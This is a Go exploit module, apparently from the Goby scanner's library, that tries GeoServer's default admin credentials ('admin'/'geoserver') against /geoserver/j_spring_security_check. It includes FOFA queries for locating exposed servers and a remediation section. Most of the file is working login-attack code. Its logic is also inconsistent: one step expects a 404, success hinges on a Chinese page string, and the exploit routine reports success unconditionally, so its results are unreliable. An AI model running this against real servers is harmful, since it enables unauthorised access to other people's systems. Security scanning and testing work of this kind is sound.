package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "GeoServer /geoserver/j_spring_security_check Default Password Vulnerability",
    "Description": "<p>GeoServer is an open-source software server that belongs to the field of geographic information system and adheres to the OpenGIS web server specification. GeoServer can publish any data stored in any spatial data source that complies with open standards (shp, tif, etc.), and allow users to update, delete, and insert feature data, and it is relatively easy to share spatial geographic information data between users through GeoServer, and the application has a default password, and attackers can log in to the system to obtain sensitive information.</p>",
    "Product": "GeoServer",
    "Homepage": "http://opengeo.org/technology/geoserver/",
    "DisclosureDate": "2024-09-27",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "title=\"GeoServer\" && body=\"GeoServer \" || (body=\"Powered by Eclipse Jetty\")",
    "GobyQuery": "title=\"GeoServer\" && body=\"GeoServer \" || (body=\"Powered by Eclipse Jetty\")",
    "Level": "1",
    "Impact": "<p>An attacker can use the default password vulnerability to control the entire platform and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "info",
            "type": "select",
            "value": "default",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/geoserver/j_spring_security_check",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": "username=admin&password=geoserver"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "admin",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/geoserver/j_spring_security_check",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": "username=admin&password=geoserver"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "404",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password",
        "2H1W"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "5.5",
    "Translation": {
        "CN": {
            "Name": "GeoServer /geoserver/j_spring_security_check 默认口令漏洞",
            "Product": "GeoServer",
            "Description": "<p>GeoServer是一个属于地理信息系统领域，遵守OpenGIS Web 服务器规范的开源软件服务器。 GeoServer可以发布任意存储在任何遵守开放标准的空间数据源中的数据（shp、tif等），并允许用户对特征数据进行更新、删除、插入操作，通过GeoServer 可以比较容易的在用户之间共享空间地理信息数据，该应用存在默认口令，攻击者可以登录该系统获取敏感信息。</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。<br></p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "GeoServer /geoserver/j_spring_security_check Default Password Vulnerability",
            "Product": "GeoServer",
            "Description": "<p>GeoServer is an open-source software server that belongs to the field of geographic information system and adheres to the OpenGIS web server specification. GeoServer can publish any data stored in any spatial data source that complies with open standards (shp, tif, etc.), and allow users to update, delete, and insert feature data, and it is relatively easy to share spatial geographic information data between users through GeoServer, and the application has a default password, and attackers can log in to the system to obtain sensitive information.<br></p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.<br></p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>An attacker can use the default password vulnerability to control the entire platform and use administrator privileges to operate core functions.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2024-09-29",
    "Variables": {},
    "PocId": "9957"
}`
	sendPayloadyp2Vnbp5 := func(hostInfo *httpclient.FixUrl, pwdInfoList []string) (bool, string, string) {
		// 注意：返回的第一个值为bool值，若弱口令登录成功请返回true，否则返回false
		// 注意：vulPath是默认口令请求路径，请以 "/login" 的格式返回
		// 注意：vulInfo是默认口令，请以 "admin:123456" 的格式返回
		vulPath := `/geoserver/j_spring_security_check`
		vulInfo := ``

		for _, pwdInfo := range pwdInfoList {
			postRequestConfig := httpclient.NewPostRequestConfig(vulPath)
			postRequestConfig.VerifyTls = false
			postRequestConfig.FollowRedirect = true
			postRequestConfig.Header.Store("Content-Type", " application/x-www-form-urlencoded")
			postRequestConfig.Data = fmt.Sprintf("action=login&username=admin&password=%s", pwdInfo)
			//请求
			response, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
			if err != nil {
				return false, vulInfo, vulPath
			}
			if strings.Contains(response.RawBody, "登录身份") {
				vulInfo = "admin" + ":" + pwdInfo
				return true, vulInfo, vulPath
			}
		}
		return false, vulInfo, vulPath
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
			pwdInfoList := []string{`admin`, `geoserver`}
			respBool, vulInfo, vulPath := sendPayloadyp2Vnbp5(hostInfo, pwdInfoList)

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			if respBool {
				ss.VulURL = hostInfo.Scheme() + "://" + vulInfo + "@" + hostInfo.HostInfo + vulPath
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
			defaultModeMap := map[string][]string{
				"default": {"admin", "geoserver"},
			}
			mode := goutils.B2S(ss.Params["info"])
			pwdInfoList := defaultModeMap[mode]
			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			_, vulInfo, _ := sendPayloadyp2Vnbp5(expResult.HostInfo, pwdInfoList)
			expResult.Output = `Please use "` + vulInfo + `" to login`
			expResult.Success = true
			return expResult
		},
	))
}
